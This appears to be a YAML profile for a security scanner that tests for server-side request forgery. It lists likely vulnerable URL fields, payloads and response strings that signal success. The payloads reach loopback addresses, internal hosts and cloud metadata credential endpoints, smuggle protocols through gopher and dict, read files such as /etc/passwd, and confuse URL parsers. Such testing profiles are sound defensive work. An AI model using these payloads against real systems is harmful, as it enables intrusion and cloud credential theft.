# SSRF (Server-Side Request Forgery) Attack Profile
# Tests for SSRF vulnerabilities where an attacker tricks the server into
# making requests to unintended internal or external resources.

name: "SSRF - Server-Side Request Forgery"
category: "request-forgery"
severity: "critical"
description: >
  Tests for Server-Side Request Forgery vulnerabilities where user-supplied URLs
  or endpoints cause the server to make unintended requests to internal services,
  cloud metadata endpoints, or other restricted resources.

# Fields commonly vulnerable to SSRF
target_fields:
  - "url"
  - "endpoint"
  - "link"
  - "redirect"
  - "uri"
  - "href"
  - "target"
  - "dest"
  - "destination"
  - "fetch"
  - "site"
  - "host"
  - "proxy"
  - "callback"
  - "webhook"
  - "image_url"
  - "avatar_url"
  - "feed"
  - "source"
  - "metadata_url"
  - "check_url"
  - "validate_url"

# Attack payloads to test
payloads:
  # --- Localhost / loopback access ---
  - "http://127.0.0.1"
  - "http://127.0.0.1:80"
  - "http://127.0.0.1:443"
  - "http://127.0.0.1:8080"
  - "http://127.0.0.1:8443"
  - "http://127.0.0.1:3000"
  - "http://localhost"
  - "http://localhost:8080"
  - "http://localhost/admin"
  - "http://localhost/server-status"
  - "http://[::1]"
  - "http://[::1]:8080"
  - "http://0.0.0.0"
  - "http://0.0.0.0:8080"

  # --- Localhost bypass / Obfuscation techniques ---
  - "http://0x7f000001/"
  - "http://0177.0000.0000.0001/"
  - "http://2130706433/"
  - "http://017700000001/"
  - "http://127.1/"
  - "http://127.0.1/"
  - "http://0/"
  - "http://0.0.0.0/"
  - "http://①②⑦.⓪.⓪.①/"
  - "http://127.0.0.1.nip.io/"
  - "http://localtest.me/"
  - "http://spoofed.burpcollaborator.net/"
  - "http://%31%32%37%2E%30%2E%30%2E%31" # URL encoded 127.0.0.1

  # --- Cloud metadata endpoints (AWS) ---
  - "http://169.254.169.254/latest/meta-data/"
  - "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  - "http://169.254.169.254/latest/user-data/"
  - "http://169.254.169.254/latest/api/token"
  - "http://169.254.169.254/latest/dynamic/instance-identity/document"
  - "http://169.254.169.254/"

  # --- Cloud metadata endpoints (GCP) ---
  - "http://metadata.google.internal/computeMetadata/v1/"
  - "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
  - "http://169.254.169.254/computeMetadata/v1/"

  # --- Cloud metadata endpoints (Azure) ---
  - "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
  - "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01"

  # --- Cloud metadata endpoints (DigitalOcean) ---
  - "http://169.254.169.254/metadata/v1/"
  - "http://169.254.169.254/metadata/v1/id"

  # --- Cloud metadata endpoints (Oracle Cloud) ---
  - "http://169.254.169.254/opc/v1/instance/"

  # --- Internal network scanning ---
  - "http://192.168.0.1"
  - "http://192.168.1.1"
  - "http://10.0.0.1"
  - "http://172.16.0.1"
  - "http://192.168.1.1:8080"
  - "http://10.0.0.1:9200"
  - "http://10.0.0.1:6379"
  - "http://10.0.0.1:27017"

  # --- Protocol smuggling / Alternate Schemes ---
  - "gopher://127.0.0.1:25/"
  - "gopher://127.0.0.1:6379/_INFO"
  - "dict://127.0.0.1:6379/INFO"
  - "file:///etc/passwd"
  - "file:///etc/hosts"
  - "file:///c:/windows/system32/drivers/etc/hosts"
  - "ftp://127.0.0.1/"
  - "ldap://127.0.0.1/"
  - "sftp://127.0.0.1/"
  - "tftp://127.0.0.1/"

  # --- DNS rebinding probes ---
  - "http://make-127-0-0-1-rr.1u.ms/"

  # --- URL parser confusion ---
  - "http://evil.com@127.0.0.1/"
  - "http://127.0.0.1#@evil.com/"
  - "http://127.0.0.1%2523@evil.com/"
  - "http://127.0.0.1:80@evil.com/"
  - "http://evil.com\\@127.0.0.1/"

# Indicators that suggest successful SSRF
success_indicators:
  response_contains:
    # AWS metadata indicators
    - "ami-id"
    - "instance-id"
    - "instance-type"
    - "security-credentials"
    - "iam"
    - "AccessKeyId"
    - "SecretAccessKey"
    # GCP metadata indicators
    - "computeMetadata"
    - "service-accounts"
    - "access_token"
    # Azure metadata indicators
    - "vmId"
    - "subscriptionId"
    # Internal service indicators
    - "root:x:"
    - "localhost"
    - "127.0.0.1"
    - "Apache Server Status"
    - "Server at localhost"
    - "phpinfo()"
    # Internal service banners
    - "Redis"
    - "MongoDB"
    - "Elasticsearch"
    - "PostgreSQL"
    - "SSH-2.0"
